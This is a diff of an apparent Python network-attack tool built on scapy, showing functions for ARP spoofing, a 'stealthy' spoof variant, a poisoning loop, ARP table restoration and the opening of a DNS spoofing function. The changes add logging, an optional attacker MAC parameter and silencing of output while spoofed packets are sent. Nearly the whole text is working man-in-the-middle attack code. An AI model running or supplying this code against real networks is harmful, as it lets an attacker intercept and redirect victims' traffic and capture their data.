@@ -73,46 +73,58 @@ def get_mac(source, dest):
 
 
 # Normal way of doing ARP spoofing
-def arp_spoof(victim_ip, victim_mac, router_ip, router_mac):
+def arp_spoof(victim_ip, victim_mac, router_ip, router_mac, attacker_mac=None):
     # Gets the mac address of the attacker
     interface = scapy.all.get_working_if()
-    attacker_mac = scapy.all.get_if_hwaddr(interface)
+    if attacker_mac is None:
+        attacker_mac = scapy.all.get_if_hwaddr(interface)
 
     # sends packets to the victim and server, performing ARP spoofing
+    logger.info("Spoofing target")
+    sys.stdout = open(os.devnull, 'w')
     scapy.all.send(scapy.all.ARP(op=2, pdst=victim_ip, psrc=router_ip, hwdst=victim_mac, hwsrc=attacker_mac))
     scapy.all.send(scapy.all.ARP(op=2, pdst=router_ip, psrc=victim_ip, hwdst=router_mac, hwsrc=attacker_mac))
+    sys.stdout = sys.__stdout__
 
 
 # Restores the ARP spoofing packets by resetting back to original state
 def arp_restore(victim_ip, victim_mac, router_ip, router_mac):
+    logger.info("Starting ARP restoration")
+    sys.stdout = open(os.devnull, 'w')
     scapy.all.send(scapy.all.ARP(op=2, pdst=router_ip, psrc=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac), count=4)
     scapy.all.send(scapy.all.ARP(op=2, pdst=victim_ip, psrc=router_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=router_mac), count=4)
+    sys.stdout = sys.__stdout__
+    logger.info("Restoration successful")
 
 
 # Does ARP spoofing but in a more stealthy way
-def arp_spoof_stealth(victim_ip, victim_mac, router_ip, router_mac):
+def arp_spoof_stealth(victim_ip, victim_mac, router_ip, attacker_mac=None):
     # Gets the mac address of the attacker
     interface = scapy.all.get_working_if()
-    attacker_mac = scapy.all.get_if_hwaddr(interface)
+    if attacker_mac is None:
+        attacker_mac = scapy.all.get_if_hwaddr(interface)
 
     # Sends packet to the server
+    logger.info("Spoofing target")
+    sys.stdout = open(os.devnull, 'w')
     scapy.all.send(scapy.all.ARP(op=1, hwsrc=attacker_mac, psrc=router_ip, hwdst=victim_mac, pdst=victim_ip))
+    sys.stdout = sys.__stdout__
 
 
-def arp_poison(victim_ip, victim_mac, router_ip, router_mac, iterations= 100):
-    print("Spoofing network...")
+def arp_poison(victim_ip, victim_mac, router_ip, router_mac, attacker_mac, iterations=100):
+    logger.info("Start spoofing network...")
     try:
         for i in range(iterations):
-            arp_spoof(victim_ip, victim_mac, router_ip, router_mac)
+            logger.info("Starting iteration " + str(i))
+            arp_spoof(victim_ip, victim_mac, router_ip, router_mac, attacker_mac)
             time.sleep(2)
     except KeyboardInterrupt:
-        print("Restoring network...")
         arp_restore(victim_ip, victim_mac, router_ip, router_mac)
 
 
-def arp_poison_stealthy(victim_ip, victim_mac, router_ip, router_mac):
-    # arp_spoof('192.168.56.101', '0:0:0:0:0:0', '192.168.56.1', '0a:00:27:00:00:13')
-    arp_spoof_stealth(victim_ip, victim_mac, router_ip, router_mac)
+def arp_poison_stealthy(victim_ip, victim_mac, router_ip, attacker_mac):
+    logger.info("Start spoofing network silently...")
+    arp_spoof_stealth(victim_ip, victim_mac, router_ip, attacker_mac)
 
 
 def dns_spoofing(interface, website, ip, spoof_all):
